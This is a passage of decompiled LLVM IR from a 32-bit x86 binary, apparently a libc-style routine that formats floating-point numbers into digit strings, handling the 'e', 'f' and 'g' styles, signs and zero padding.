  %tmp136 = urem i32 %v0_80546c5, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_80546b8, i32* %eax.global-to-local, align 4
  %v1_80546d1 = or i32 %tmp136, 48
  %v8_80546d1 = trunc i32 %v1_80546d1 to i8
  store i32 %v1_80546d1, i32* %edx.global-to-local, align 4
  %v3_80546d7 = inttoptr i32 %v2_80546b8 to i8*
  store i8 %v8_80546d1, i8* %v3_80546d7, align 1
  %v7_80546d9 = icmp sgt i32 %v1_80546b3, 8
  br i1 %v7_80546d9, label %dec_label_pc_80546db, label %dec_label_pc_80546b3.dec_label_pc_80546b3_crit_edge

dec_label_pc_80546b3.dec_label_pc_80546b3_crit_edge: ; preds = %dec_label_pc_80546b3
  %v0_80546b3.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_80546c5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80546b3

dec_label_pc_80546db:                             ; preds = %dec_label_pc_80546b3
  %v0_80546db = load i32, i32* @edi, align 4
  %v1_80546db = add i32 %v0_80546db, 1
  store i32 %v1_80546db, i32* @edi, align 4
  %v7_80546df = icmp sgt i32 %v1_80546db, 2
  br i1 %v7_80546df, label %dec_label_pc_80546e1, label %dec_label_pc_80546db.dec_label_pc_805468a_crit_edge

dec_label_pc_80546db.dec_label_pc_805468a_crit_edge: ; preds = %dec_label_pc_80546db
  %v0_805468a.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805468a.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_80546a7.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805468a

dec_label_pc_80546e1:                             ; preds = %dec_label_pc_80546db
  %v0_80546e1 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80546e1 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80546e1, x86_fp80* %st0.global-to-local, align 4
  %v2_80546e3 = add i3 %v0_80546e1, 2
  store i3 %v2_80546e3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80546e5 = add i8 %stack_var_-206.0, -96
  %v6_80546e5 = sub i8 95, %stack_var_-206.0
  %v7_80546e5 = and i8 %v6_80546e5, %stack_var_-206.0
  %v8_80546e5 = icmp slt i8 %v7_80546e5, 0
  %v9_80546e5 = icmp eq i8 %v4_80546e5, 0
  %v10_80546e5 = icmp slt i8 %v4_80546e5, 0
  %v3_80546ea = icmp eq i1 %v10_80546e5, %v8_80546e5
  %v4_80546ea = icmp eq i1 %v9_80546e5, false
  %v5_80546ea = and i1 %v4_80546ea, %v3_80546ea
  br i1 %v5_80546ea, label %dec_label_pc_80546f9, label %dec_label_pc_80546ec

dec_label_pc_80546ec:                             ; preds = %dec_label_pc_80546e1
  %v4_80546ec = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_80546f9

dec_label_pc_80546f9:                             ; preds = %dec_label_pc_80546e1, %dec_label_pc_80546ec
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_80546e1 ], [ %v4_80546ec, %dec_label_pc_80546ec ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80546e1 ], [ 69, %dec_label_pc_80546ec ]
  %v12_80546f9 = icmp eq i8 %stack_var_-206.1, 103
  %v1_80546fe = icmp eq i1 %v12_80546f9, false
  br i1 %v1_80546fe, label %dec_label_pc_8054707, label %dec_label_pc_8054700

dec_label_pc_8054700:                             ; preds = %dec_label_pc_80546f9
  %v0_8054700 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_8054700, 1
  br i1 %tmp137, label %dec_label_pc_805470e, label %dec_label_pc_8054704

dec_label_pc_8054704:                             ; preds = %dec_label_pc_8054700
  %v1_8054704 = add i32 %v0_8054700, -1
  store i32 %v1_8054704, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805470e

dec_label_pc_8054707:                             ; preds = %dec_label_pc_80546f9
  %v12_8054707 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_8054707, label %dec_label_pc_8054712, label %dec_label_pc_8054707.dec_label_pc_805470e_crit_edge

dec_label_pc_8054707.dec_label_pc_805470e_crit_edge: ; preds = %dec_label_pc_8054707
  %v0_805470e.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805470e

dec_label_pc_805470e:                             ; preds = %dec_label_pc_8054707.dec_label_pc_805470e_crit_edge, %dec_label_pc_8054700, %dec_label_pc_8054704
  %v0_805470e = phi i32 [ %v0_805470e.pre, %dec_label_pc_8054707.dec_label_pc_805470e_crit_edge ], [ %v0_8054700, %dec_label_pc_8054700 ], [ %v1_8054704, %dec_label_pc_8054704 ]
  store i32 %v0_805470e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805473f

dec_label_pc_8054712:                             ; preds = %dec_label_pc_8054707
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_8054716 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054716 = add i32 %v0_8054716, -1
  store i32 %v2_8054716, i32* %ebx.global-to-local, align 4
  %v5_805471d = icmp slt i32 %v2_8054716, -1
  br i1 %v5_805471d, label %dec_label_pc_805471f, label %dec_label_pc_805473f

dec_label_pc_805471f:                             ; preds = %dec_label_pc_8054712
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054727 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8054727, i32* %eax.global-to-local, align 4
  %v4_805472f = bitcast i32* %stack_var_-72 to i8*
  %v5_805472f = call i32 @__GI_memset(i8* %v4_805472f, i32 48, i32 21)
  store i32 %v5_805472f, i32* %eax.global-to-local, align 4
  %v0_805474f.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805473f

dec_label_pc_805473f:                             ; preds = %dec_label_pc_8054712, %dec_label_pc_805471f, %dec_label_pc_805470e
  %v1_805475f = phi i32 [ %v0_805470e, %dec_label_pc_805470e ], [ %v0_805474f.pr.pre, %dec_label_pc_805471f ], [ %v2_8054716, %dec_label_pc_8054712 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8054752 = icmp sgt i32 %v1_805475f, 20
  br i1 %v7_8054752, label %dec_label_pc_8054754, label %dec_label_pc_805475f

dec_label_pc_8054754:                             ; preds = %dec_label_pc_805473f
  %v2_8054754 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8054754, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054773.preheader

dec_label_pc_805475f:                             ; preds = %dec_label_pc_805473f
  %v0_805475f = load i32, i32* @esp, align 4
  %v2_805475f = add i32 %v1_805475f, 165
  %v3_805475f = add i32 %v2_805475f, %v0_805475f
  store i32 %v3_805475f, i32* %eax.global-to-local, align 4
  %v1_8054766 = add i32 %v3_805475f, 2
  store i32 %v1_8054766, i32* %ecx.global-to-local, align 4
  %v2_8054769 = inttoptr i32 %v1_8054766 to i8*
  %v3_8054769 = load i8, i8* %v2_8054769, align 1
  %v4_8054769 = add i8 %v3_8054769, -53
  %v9_8054769 = sub i8 52, %v3_8054769
  %v10_8054769 = and i8 %v9_8054769, %v3_8054769
  %v11_8054769 = icmp slt i8 %v10_8054769, 0
  %v13_8054769 = icmp slt i8 %v4_8054769, 0
  %v2_805476d = icmp eq i1 %v13_8054769, %v11_8054769
  %v3_805476d = zext i1 %v2_805476d to i32
  br label %dec_label_pc_8054773.preheader

dec_label_pc_8054773.preheader:                   ; preds = %dec_label_pc_805475f, %dec_label_pc_8054754
  %v0_805477363 = phi i32 [ %v1_8054766, %dec_label_pc_805475f ], [ %v2_8054754, %dec_label_pc_8054754 ]
  %storemerge52 = phi i32 [ %v3_805476d, %dec_label_pc_805475f ], [ 0, %dec_label_pc_8054754 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054773

dec_label_pc_8054773:                             ; preds = %dec_label_pc_8054773.backedge, %dec_label_pc_8054773.preheader
  %v3_8054774 = phi i32 [ %v3_8054774.pre, %dec_label_pc_8054773.backedge ], [ %storemerge52, %dec_label_pc_8054773.preheader ]
  %v0_8054773 = phi i32 [ %v0_8054776, %dec_label_pc_8054773.backedge ], [ %v0_805477363, %dec_label_pc_8054773.preheader ]
  %v1_8054773 = add i32 %v0_8054773, -1
  store i32 %v1_8054773, i32* %ecx.global-to-local, align 4
  %v1_8054774 = inttoptr i32 %v1_8054773 to i8*
  %v2_8054774 = load i8, i8* %v1_8054774, align 1
  %v4_8054774 = trunc i32 %v3_8054774 to i8
  %v5_8054774 = add i8 %v2_8054774, %v4_8054774
  store i8 %v5_8054774, i8* %v1_8054774, align 1
  %v0_8054776 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054776 = inttoptr i32 %v0_8054776 to i8*
  %v2_8054776 = load i8, i8* %v1_8054776, align 1
  %v3_8054776 = zext i8 %v2_8054776 to i32
  %v4_8054776 = load i32, i32* %edx.global-to-local, align 4
  %v5_8054776 = and i32 %v4_8054776, -256
  %v6_8054776 = or i32 %v5_8054776, %v3_8054776
  store i32 %v6_8054776, i32* %edx.global-to-local, align 4
  %v7_8054778 = icmp eq i8 %v2_8054776, 48
  br i1 %v7_8054778, label %dec_label_pc_8054773.backedge, label %dec_label_pc_805477d

dec_label_pc_8054773.backedge:                    ; preds = %dec_label_pc_8054773, %dec_label_pc_805477d
  %v3_8054774.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054773

dec_label_pc_805477d:                             ; preds = %dec_label_pc_8054773
  %v2_805477d = add i8 %v2_8054776, -57
  %v7_805477d = sub i8 56, %v2_8054776
  %v8_805477d = and i8 %v7_805477d, %v2_8054776
  %v9_805477d = icmp slt i8 %v8_805477d, 0
  %v10_805477d = icmp eq i8 %v2_805477d, 0
  %v11_805477d = icmp slt i8 %v2_805477d, 0
  %v3_8054780 = icmp eq i1 %v11_805477d, %v9_805477d
  %v4_8054780 = icmp eq i1 %v10_805477d, false
  %v5_8054780 = and i1 %v4_8054780, %v3_8054780
  br i1 %v5_8054780, label %dec_label_pc_8054773.backedge, label %dec_label_pc_8054782

dec_label_pc_8054782:                             ; preds = %dec_label_pc_805477d
  %v2_8054782 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8054782, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_8054776, %v2_8054782
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_805478d, label %dec_label_pc_805479a

dec_label_pc_805478d:                             ; preds = %dec_label_pc_8054782
  store i32 %v2_805466f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80547a3

dec_label_pc_805479a:                             ; preds = %dec_label_pc_8054782
  store i32 %v2_8054782, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_8054782, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80547a3

dec_label_pc_80547a3:                             ; preds = %dec_label_pc_805478d, %dec_label_pc_805479a
  %v0_80547a3 = phi i32 [ %v0_8054776, %dec_label_pc_805478d ], [ %v2_8054782, %dec_label_pc_805479a ]
  %v1_80547a3 = add i32 %v0_80547a3, 1
  store i32 %v1_80547a3, i32* %eax.global-to-local, align 4
  %v2_80547aa = inttoptr i32 %v1_80547a3 to i8*
  store i8 0, i8* %v2_80547aa, align 1
  br i1 %v1_80546fe, label %dec_label_pc_80547d0, label %dec_label_pc_80547b5

dec_label_pc_80547b5:                             ; preds = %dec_label_pc_80547a3
  %v0_80547b5 = load i32, i32* %esi.global-to-local, align 4
  %v5_80547b8 = icmp slt i32 %v0_80547b5, -4
  br i1 %v5_80547b8, label %dec_label_pc_80547dd, label %dec_label_pc_80547ba

dec_label_pc_80547ba:                             ; preds = %dec_label_pc_80547b5
  %v1_80547ba = load i32, i32* %ebx.global-to-local, align 4
  %v7_80547bc = icmp slt i32 %v1_80547ba, %v0_80547b5
  br i1 %v7_80547bc, label %dec_label_pc_80547dd, label %dec_label_pc_80547c5

dec_label_pc_80547c5:                             ; preds = %dec_label_pc_80547ba
  %v2_80547cc = sub i32 %v1_80547ba, %v0_80547b5
  store i32 %v2_80547cc, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80547e1

dec_label_pc_80547d0:                             ; preds = %dec_label_pc_80547a3
  %v4_80547d0 = zext i8 %stack_var_-206.1 to i32
  %v5_80547d0 = load i32, i32* %ecx.global-to-local, align 4
  %v6_80547d0 = and i32 %v5_80547d0, -256
  %v7_80547d0 = or i32 %v6_80547d0, %v4_80547d0
  store i32 %v7_80547d0, i32* %ecx.global-to-local, align 4
  %v10_80547d8 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_80547d8, label %dec_label_pc_80547d0.dec_label_pc_80547e1_crit_edge, label %dec_label_pc_80547dd

dec_label_pc_80547d0.dec_label_pc_80547e1_crit_edge: ; preds = %dec_label_pc_80547d0
  %v0_80547e1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80547e1

dec_label_pc_80547dd:                             ; preds = %dec_label_pc_80547b5, %dec_label_pc_80547ba, %dec_label_pc_80547d0
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_80547d0 ], [ 103, %dec_label_pc_80547ba ], [ 103, %dec_label_pc_80547b5 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80547eb

dec_label_pc_80547e1:                             ; preds = %dec_label_pc_80547d0.dec_label_pc_80547e1_crit_edge, %dec_label_pc_80547c5
  %v0_80547e1 = phi i32 [ %v0_80547e1.pre, %dec_label_pc_80547d0.dec_label_pc_80547e1_crit_edge ], [ %v0_80547b5, %dec_label_pc_80547c5 ]
  store i32 %v0_80547e1, i32* %ebx.global-to-local, align 4
  %v2_80547e3 = icmp slt i32 %v0_80547e1, 0
  %v1_80547e5 = icmp eq i1 %v2_80547e3, false
  br i1 %v1_80547e5, label %dec_label_pc_80547eb, label %dec_label_pc_80547e7

dec_label_pc_80547e7:                             ; preds = %dec_label_pc_80547e1
  %v0_80547e7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80547e7 = add i32 %v0_80547e7, -1
  store i32 %v1_80547e7, i32* %edx.global-to-local, align 4
  %v1_80547e8 = inttoptr i32 %v1_80547e7 to i8*
  store i8 48, i8* %v1_80547e8, align 1
  %v0_8054820.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80547eb

dec_label_pc_80547eb:                             ; preds = %dec_label_pc_80547e1, %dec_label_pc_80547dd, %dec_label_pc_80547e7
  %v1_805487b = phi i32 [ %v0_80547e1, %dec_label_pc_80547e1 ], [ %v0_8054820.pre, %dec_label_pc_80547e7 ], [ 0, %dec_label_pc_80547dd ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_80547e1 ], [ 102, %dec_label_pc_80547e7 ], [ %stack_var_-197.0, %dec_label_pc_80547dd ]
  %v2_80547eb = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80547eb, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_8054806 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054806 = inttoptr i32 %v0_8054806 to i8*
  %v2_8054806 = load i8, i8* %v1_8054806, align 1
  %v3_8054806 = zext i8 %v2_8054806 to i32
  %v5_8054806 = and i32 %v2_80547eb, -256
  %v6_8054806 = or i32 %v3_8054806, %v5_8054806
  store i32 %v6_8054806, i32* %eax.global-to-local, align 4
  %v1_8054808 = add i32 %v0_8054806, 1
  store i32 %v1_8054808, i32* %edi.global-to-local, align 4
  store i32 %v6_8054806, i32* %stack_var_-22, align 4
  %v2_8054816 = sub i32 %v1_80547a3, %v1_8054808
  store i32 %v2_8054816, i32* %edx.global-to-local, align 4
  %v1_8054820 = icmp eq i32 %v1_805487b, 0
  %v2_8054820 = icmp slt i32 %v1_805487b, 0
  br i1 %v2_8054820, label %dec_label_pc_805486f, label %dec_label_pc_8054824

dec_label_pc_8054824:                             ; preds = %dec_label_pc_80547eb
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8054830 = sub i32 %v1_805487b, %v2_8054816
  %v8_8054830 = xor i32 %v2_8054816, %v1_805487b
  %v9_8054830 = xor i32 %v2_8054830, %v1_805487b
  %v10_8054830 = and i32 %v9_8054830, %v8_8054830
  %v11_8054830 = icmp slt i32 %v10_8054830, 0
  %v13_8054830 = icmp slt i32 %v2_8054830, 0
  %v2_8054832 = icmp eq i1 %v13_8054830, %v11_8054830
  br i1 %v2_8054832, label %dec_label_pc_8054834, label %dec_label_pc_8054868

dec_label_pc_8054834:                             ; preds = %dec_label_pc_8054824
  store i32 %v2_8054830, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_8054830, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8054849, label %dec_label_pc_8054864

dec_label_pc_8054849:                             ; preds = %dec_label_pc_8054834
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8054864

dec_label_pc_8054864:                             ; preds = %dec_label_pc_8054834, %dec_label_pc_8054849
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8054849 ], [ %stack_var_-132, %dec_label_pc_8054834 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054884

dec_label_pc_8054868:                             ; preds = %dec_label_pc_8054824
  %v4_805486a = icmp eq i1 %v1_8054820, false
  br i1 %v4_805486a, label %dec_label_pc_8054875, label %dec_label_pc_805486c

dec_label_pc_805486c:                             ; preds = %dec_label_pc_8054868
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805486f

dec_label_pc_805486f:                             ; preds = %dec_label_pc_80547eb, %dec_label_pc_805486c
  %v0_80548b773 = phi i32 [ %v1_805487b, %dec_label_pc_80547eb ], [ -1, %dec_label_pc_805486c ]
  %v2_805486f = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805486f, i32* @ecx, align 4
  br label %dec_label_pc_8054884

dec_label_pc_8054875:                             ; preds = %dec_label_pc_8054868
  %v2_8054879 = add i32 %v1_8054808, %v1_805487b
  store i32 %v2_8054879, i32* %edi.global-to-local, align 4
  %v2_805487b = sub i32 %v2_8054816, %v1_805487b
  store i32 %v2_805487b, i32* %edx.global-to-local, align 4
  %v2_805487d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805487d, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054884

dec_label_pc_8054884:                             ; preds = %dec_label_pc_805486f, %dec_label_pc_8054864, %dec_label_pc_8054875
  %v0_80548b772 = phi i32 [ %v0_80548b773, %dec_label_pc_805486f ], [ -1, %dec_label_pc_8054864 ], [ -1, %dec_label_pc_8054875 ]
  %v0_80548a0 = phi i32 [ %v2_805486f, %dec_label_pc_805486f ], [ %storemerge10, %dec_label_pc_8054864 ], [ %v2_805487d, %dec_label_pc_8054875 ]
  %v0_8054891 = phi i32 [ %v2_8054816, %dec_label_pc_805486f ], [ 0, %dec_label_pc_8054864 ], [ %v2_805487b, %dec_label_pc_8054875 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_805488b = inttoptr i32 %v1_80544e3 to i8*
  %v3_805488b = load i8, i8* %v2_805488b, align 1
  %v4_805488b = and i8 %v3_805488b, 16
  %v5_805488b = icmp eq i8 %v4_805488b, 0
  %v1_805488f = icmp eq i1 %v5_805488b, false
  br i1 %v1_805488f, label %dec_label_pc_80548a0, label %dec_label_pc_8054891

dec_label_pc_8054891:                             ; preds = %dec_label_pc_8054884
  %v1_8054891 = icmp eq i32 %v0_8054891, 0
  %v1_8054893 = icmp eq i1 %v1_8054891, false
  br i1 %v1_8054893, label %dec_label_pc_80548a0, label %dec_label_pc_8054895

dec_label_pc_8054895:                             ; preds = %dec_label_pc_8054891
  br i1 %v12_80546f9, label %dec_label_pc_80548b7, label %dec_label_pc_805489c

dec_label_pc_805489c:                             ; preds = %dec_label_pc_8054895
  %v0_805489c = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_805489c, 1
  br i1 %tmp140, label %dec_label_pc_80548b7, label %dec_label_pc_80548a0

dec_label_pc_80548a0:                             ; preds = %dec_label_pc_805489c, %dec_label_pc_8054891, %dec_label_pc_8054884
  %v1_80548a0 = inttoptr i32 %v0_80548a0 to i32*
  store i32 112, i32* %v1_80548a0, align 4
  %v0_80548a6 = load i32, i32* @ecx, align 4
  %v1_80548a6 = add i32 %v0_80548a6, 4
  %v2_80548a6 = inttoptr i32 %v1_80548a6 to i32*
  store i32 1, i32* %v2_80548a6, align 4
  %v0_80548ad = load i32, i32* @ecx, align 4
  %v1_80548ad = add i32 %v0_80548ad, 8
  %v2_80548ad = inttoptr i32 %v1_80548ad to i32*
  store i32 ptrtoint (i32* @global_var_8060e80.786 to i32), i32* %v2_80548ad, align 4
  %v0_80548b4 = load i32, i32* @ecx, align 4
  %v1_80548b4 = add i32 %v0_80548b4, 12
  store i32 %v1_80548b4, i32* @ecx, align 4
  %v0_80548b7.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80548b7

dec_label_pc_80548b7:                             ; preds = %dec_label_pc_805489c, %dec_label_pc_8054895, %dec_label_pc_80548a0
  %v0_80548bc = phi i32 [ %v0_80548a0, %dec_label_pc_805489c ], [ %v0_80548a0, %dec_label_pc_8054895 ], [ %v1_80548b4, %dec_label_pc_80548a0 ]
  %v0_80548b7 = phi i32 [ %v0_80548b772, %dec_label_pc_805489c ], [ %v0_80548b772, %dec_label_pc_8054895 ], [ %v0_80548b7.pre, %dec_label_pc_80548a0 ]
  %v1_80548b7 = add i32 %v0_80548b7, 1
  %v8_80548b7 = icmp eq i32 %v1_80548b7, 0
  store i32 %v1_80548b7, i32* %ebx.global-to-local, align 4
  br i1 %v8_80548b7, label %dec_label_pc_80548d1, label %dec_label_pc_80548ba

dec_label_pc_80548ba:                             ; preds = %dec_label_pc_80548b7
  store i32 %v1_80548b7, i32* %eax.global-to-local, align 4
  %v1_80548bc = inttoptr i32 %v0_80548bc to i32*
  store i32 176, i32* %v1_80548bc, align 4
  %v0_80548c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80548c2 = sub i32 0, %v0_80548c2
  store i32 %v1_80548c2, i32* %eax.global-to-local, align 4
  %v1_80548c4 = load i32, i32* @ecx, align 4
  %v2_80548c4 = add i32 %v1_80548c4, 4
  %v3_80548c4 = inttoptr i32 %v2_80548c4 to i32*
  store i32 %v1_80548c2, i32* %v3_80548c4, align 4
  %v0_80548c7 = load i32, i32* @ecx, align 4
  %v1_80548c7 = add i32 %v0_80548c7, 8
  %v2_80548c7 = inttoptr i32 %v1_80548c7 to i32*
  store i32 ptrtoint (i32* @global_var_8060e73.785 to i32), i32* %v2_80548c7, align 4
  %v0_80548ce = load i32, i32* @ecx, align 4
  %v1_80548ce = add i32 %v0_80548ce, 12
  store i32 %v1_80548ce, i32* @ecx, align 4
  br label %dec_label_pc_80548d1

dec_label_pc_80548d1:                             ; preds = %dec_label_pc_80548b7, %dec_label_pc_80548ba
  %v0_80548d5 = phi i32 [ %v0_80548bc, %dec_label_pc_80548b7 ], [ %v1_80548ce, %dec_label_pc_80548ba ]
  %v0_80548d1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80548d1 = icmp eq i32 %v0_80548d1, 0
  br i1 %v1_80548d1, label %dec_label_pc_80548e4, label %dec_label_pc_80548d5

dec_label_pc_80548d5:                             ; preds = %dec_label_pc_80548d1
  %v1_80548d5 = inttoptr i32 %v0_80548d5 to i32*
  store i32 112, i32* %v1_80548d5, align 4
  %v0_80548db = load i32, i32* %edx.global-to-local, align 4
  %v1_80548db = load i32, i32* @ecx, align 4
  %v2_80548db = add i32 %v1_80548db, 4
  %v3_80548db = inttoptr i32 %v2_80548db to i32*
  store i32 %v0_80548db, i32* %v3_80548db, align 4
  %v0_80548de = load i32, i32* %edi.global-to-local, align 4
  %v1_80548de = load i32, i32* @ecx, align 4
  %v2_80548de = add i32 %v1_80548de, 8
  %v3_80548de = inttoptr i32 %v2_80548de to i32*
  store i32 %v0_80548de, i32* %v3_80548de, align 4
  %v0_80548e1 = load i32, i32* @ecx, align 4
  %v1_80548e1 = add i32 %v0_80548e1, 12
  store i32 %v1_80548e1, i32* @ecx, align 4
  br label %dec_label_pc_80548e4

dec_label_pc_80548e4:                             ; preds = %dec_label_pc_80548d1, %dec_label_pc_80548d5
  %v0_8054902 = phi i32 [ %v0_80548d5, %dec_label_pc_80548d1 ], [ %v1_80548e1, %dec_label_pc_80548d5 ]
  br i1 %v1_80546fe, label %dec_label_pc_80548f8, label %dec_label_pc_80548eb

dec_label_pc_80548eb:                             ; preds = %dec_label_pc_80548e4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_80548f2 = load i8, i8* %v2_805488b, align 1
  %v4_80548f2 = and i8 %v3_80548f2, 16
  %v5_80548f2 = icmp eq i8 %v4_80548f2, 0
  br i1 %v5_80548f2, label %dec_label_pc_8054915, label %dec_label_pc_80548f8

dec_label_pc_80548f8:                             ; preds = %dec_label_pc_80548eb, %dec_label_pc_80548e4
  %v0_80548f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80548fa = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548fa = sub i32 %v0_80548f8, %v1_80548fa
  store i32 %v2_80548fa, i32* %eax.global-to-local, align 4
  %v1_80548fc = load i32, i32* %ebp.global-to-local, align 4
  %v2_80548fc = sub i32 %v2_80548fa, %v1_80548fc
  %v8_80548fc = xor i32 %v1_80548fc, %v2_80548fa
  %v9_80548fc = xor i32 %v2_80548fc, %v2_80548fa
  %v10_80548fc = and i32 %v9_80548fc, %v8_80548fc
  %v11_80548fc = icmp slt i32 %v10_80548fc, 0
  %v13_80548fc = icmp slt i32 %v2_80548fc, 0
  %v2_80548fe = icmp eq i1 %v13_80548fc, %v11_80548fc
  br i1 %v2_80548fe, label %dec_label_pc_8054915, label %dec_label_pc_8054900

dec_label_pc_8054900:                             ; preds = %dec_label_pc_80548f8
  %v2_8054900 = sub i32 %v1_80548fc, %v2_80548fa
  store i32 %v2_8054900, i32* %ebp.global-to-local, align 4
  %v1_8054902 = inttoptr i32 %v0_8054902 to i32*
  store i32 176, i32* %v1_8054902, align 4
  %v0_8054908 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054908 = load i32, i32* @ecx, align 4
  %v2_8054908 = add i32 %v1_8054908, 4
  %v3_8054908 = inttoptr i32 %v2_8054908 to i32*
  store i32 %v0_8054908, i32* %v3_8054908, align 4
  %v0_805490b = load i32, i32* @ecx, align 4
  %v1_805490b = add i32 %v0_805490b, 8
  %v2_805490b = inttoptr i32 %v1_805490b to i32*
  store i32 ptrtoint (i32* @global_var_8060e73.785 to i32), i32* %v2_805490b, align 4
  %v0_8054912 = load i32, i32* @ecx, align 4
  %v1_8054912 = add i32 %v0_8054912, 12
  store i32 %v1_8054912, i32* @ecx, align 4
  br label %dec_label_pc_8054915

dec_label_pc_8054915:                             ; preds = %dec_label_pc_80548f8, %dec_label_pc_80548eb, %dec_label_pc_8054900
  %v1_805499884 = phi i32 [ %v0_8054902, %dec_label_pc_80548f8 ], [ %v0_8054902, %dec_label_pc_80548eb ], [ %v1_8054912, %dec_label_pc_8054900 ]
  %v12_8054915 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8054915, label %dec_label_pc_805498b, label %dec_label_pc_805491c

dec_label_pc_805491c:                             ; preds = %dec_label_pc_8054915
  %v0_8054923 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054923 = icmp slt i32 %v0_8054923, 0
  %v1_8054925 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_8054923, i32* %edx.global-to-local, align 4
  br i1 %v2_8054923, label %dec_label_pc_8054934, label %dec_label_pc_805492b

dec_label_pc_805492b:                             ; preds = %dec_label_pc_805491c
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805493d

dec_label_pc_8054934:                             ; preds = %dec_label_pc_805491c
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_805493b = sub i32 0, %v0_8054923
  store i32 %v1_805493b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805493d

dec_label_pc_805493d:                             ; preds = %dec_label_pc_805492b, %dec_label_pc_8054934
  %v0_805495177 = phi i32 [ %v0_8054923, %dec_label_pc_805492b ], [ %v1_805493b, %dec_label_pc_8054934 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8054945 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8054945, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054951

dec_label_pc_8054951:                             ; preds = %dec_label_pc_8054951.backedge, %dec_label_pc_805493d
  %v0_805495f = phi i32 [ %v0_8054962, %dec_label_pc_8054951.backedge ], [ 2, %dec_label_pc_805493d ]
  %v0_805495b = phi i32 [ %v0_805495b.pre, %dec_label_pc_8054951.backedge ], [ %v2_8054945, %dec_label_pc_805493d ]
  %v0_8054951 = phi i32 [ %v9_8054959, %dec_label_pc_8054951.backedge ], [ %v0_805495177, %dec_label_pc_805493d ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8054958 = ashr i32 %v0_8054951, 31
  %v2_8054959 = zext i32 %v0_8054951 to i64
  %v4_8054959 = zext i32 %v1_8054958 to i64
